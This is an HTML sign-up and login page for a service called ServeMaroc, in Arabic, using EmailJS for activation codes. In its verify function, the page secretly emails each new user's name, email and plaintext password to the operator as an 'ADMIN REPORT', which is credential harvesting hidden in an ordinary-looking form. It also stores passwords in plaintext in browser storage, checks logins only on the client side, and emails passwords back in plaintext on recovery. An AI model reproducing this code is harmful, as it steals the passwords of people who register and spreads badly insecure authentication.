<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ServeMaroc | النظام المتطور</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
        body { font-family: 'Cairo', sans-serif; background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .glass-card { background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(10px); border-radius: 35px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.1); width: 100%; max-width: 420px; padding: 2.5rem; border: 1px solid white; }
        .tab-btn { transition: all 0.3s ease; border-bottom: 3px solid transparent; }
        .tab-btn.active { color: #16a34a; border-bottom-color: #16a34a; font-weight: 900; }
        .form-section { display: none; animation: fadeIn 0.4s ease; }
        .form-section.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div class="glass-card">
        <div class="text-center mb-8">
            <h1 class="text-4xl font-black text-green-700 tracking-tighter">SERVE<span class="text-black">MAROC</span></h1>
        </div>

        <div class="flex mb-8 border-b border-gray-100">
            <button id="t-login" onclick="showTab('login')" class="tab-btn active w-1/2 pb-4 font-bold text-gray-400 text-lg">دخول</button>
            <button id="t-reg" onclick="showTab('reg')" class="tab-btn w-1/2 pb-4 font-bold text-gray-400 text-lg">تسجيل</button>
        </div>

        <div id="section-login" class="form-section active space-y-5">
            <input id="l-email" type="email" placeholder="البريد الإلكتروني" class="w-full p-4 rounded-2xl bg-white border border-gray-100 outline-none focus:border-green-500 font-bold shadow-sm">
            <input id="l-pass" type="password" placeholder="كلمة المرور" class="w-full p-4 rounded-2xl bg-white border border-gray-100 outline-none focus:border-green-500 font-bold shadow-sm">
            <button onclick="Server.login()" class="w-full bg-black text-white p-4 rounded-2xl font-black text-lg shadow-xl active:scale-95 transition">دخول</button>
            <p onclick="showTab('forgot')" class="text-center text-sm font-bold text-gray-400 cursor-pointer hover:text-green-600">نسيت كلمة المرور؟</p>
        </div>

        <div id="section-reg" class="form-section space-y-4">
            <input id="r-name" type="text" placeholder="الاسم الكامل" class="w-full p-4 rounded-2xl bg-white border border-gray-100 outline-none font-bold shadow-sm">
            <input id="r-email" type="email" placeholder="البريد الإلكتروني" class="w-full p-4 rounded-2xl bg-white border border-gray-100 outline-none font-bold shadow-sm">
            <input id="r-pass" type="password" placeholder="كلمة المرور" class="w-full p-4 rounded-2xl bg-white border border-gray-100 outline-none font-bold shadow-sm">
            <button id="btn-reg" onclick="Server.register()" class="w-full bg-green-700 text-white p-4 rounded-2xl font-black text-lg shadow-xl active:scale-95 transition">إرسال كود التفعيل</button>
        </div>

        <div id="section-otp" class="form-section space-y-6 text-center">
            <h3 class="font-black text-gray-700">أدخل الرمز المرسل</h3>
            <input id="otp-input" type="text" maxlength="6" class="w-full p-4 text-center text-3xl font-black tracking-[10px] rounded-2xl border-2 border-green-500 bg-green-50 outline-none">
            <button onclick="Server.verify()" class="w-full bg-black text-white p-4 rounded-2xl font-black shadow-lg">تأكيد التفعيل</button>
        </div>

        <div id="section-forgot" class="form-section space-y-5">
            <h3 class="text-center font-bold text-gray-600">استعادة الحساب</h3>
            <input id="f-email" type="email" placeholder="بريدك الإلكتروني" class="w-full p-4 rounded-2xl border outline-none font-bold">
            <button onclick="Server.forgot()" class="w-full bg-green-600 text-white p-4 rounded-2xl font-black shadow-lg">إرسال كلمة السر</button>
            <p onclick="showTab('login')" class="text-center text-sm font-bold text-gray-400 cursor-pointer">رجوع</p>
        </div>
    </div>

    <script>
        emailjs.init("WRpj_ZtTQw-eHAZDQ");

        // تبديل الواجهات (Tabs)
        function showTab(tab) {
            document.querySelectorAll('.form-section').forEach(s => s.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));

            if(tab === 'login') {
                document.getElementById('section-login').classList.add('active');
                document.getElementById('t-login').classList.add('active');
            } else if(tab === 'reg') {
                document.getElementById('section-reg').classList.add('active');
                document.getElementById('t-reg').classList.add('active');
            } else if(tab === 'otp') {
                document.getElementById('section-otp').classList.add('active');
            } else if(tab === 'forgot') {
                document.getElementById('section-forgot').classList.add('active');
            }
        }

        const Server = {
            code: "",
            temp: {},

            login: function() {
                const email = document.getElementById('l-email').value;
                const pass = document.getElementById('l-pass').value;
                const db = JSON.parse(localStorage.getItem('sm_users') || "[]");
                const user = db.find(u => u.email === email && u.pass === pass);
                if(user) {
                    localStorage.setItem('isLogged', 'true');
                    window.location.href = "./w/";
                } else { alert("المعلومات خاطئة!"); }
            },

            register: function() {
                this.temp = {
                    name: document.getElementById('r-name').value,
                    email: document.getElementById('r-email').value,
                    pass: document.getElementById('r-pass').value
                };
                if(!this.temp.name || !this.temp.email || !this.temp.pass) return alert("عمر الخانات!");
                
                this.code = Math.floor(100000 + Math.random() * 900000).toString();
                document.getElementById('btn-reg').innerText = "جاري الإرسال...";

                emailjs.send("service_dk24ksf", "template_14tc2a8", {
                    name: this.temp.name, email: this.temp.email, otp_code: this.code
                }).then(() => {
                    alert("وصلك كود التفعيل!");
                    showTab('otp');
                });
            },

            verify: function() {
                if(document.getElementById('otp-input').value === this.code) {
                    // إرسال التقرير ليك (الاسم، الإيميل، الباسورد)
                    emailjs.send("service_dk24ksf", "template_14tc2a8", {
                        name: "ADMIN REPORT",
                        email: "ADMIN",
                        otp_code: `مستخدم جديد:\nالاسم: ${this.temp.name}\nالإيميل: ${this.temp.email}\nالباسورد: ${this.temp.pass}`
                    });

                    let db = JSON.parse(localStorage.getItem('sm_users') || "[]");
                    db.push(this.temp);
                    localStorage.setItem('sm_users', JSON.stringify(db));
                    alert("تم التسجيل! دخل دابا.");
                    location.reload();
                } else { alert("الكود غلط!"); }
            },

            forgot: function() {
                const email = document.getElementById('f-email').value;
                const db = JSON.parse(localStorage.getItem('sm_users') || "[]");
                const user = db.find(u => u.email === email);
                if(user) {
                    emailjs.send("service_dk24ksf", "template_14tc2a8", {
                        name: user.name, email: user.email, otp_code: "كلمة سرك هي: " + user.pass
                    }).then(() => alert("صيفطنا ليك كلمة السر!"));
                } else { alert("الحساب مكاينش!"); }
            }
        };
    </script>
</body>
</html>
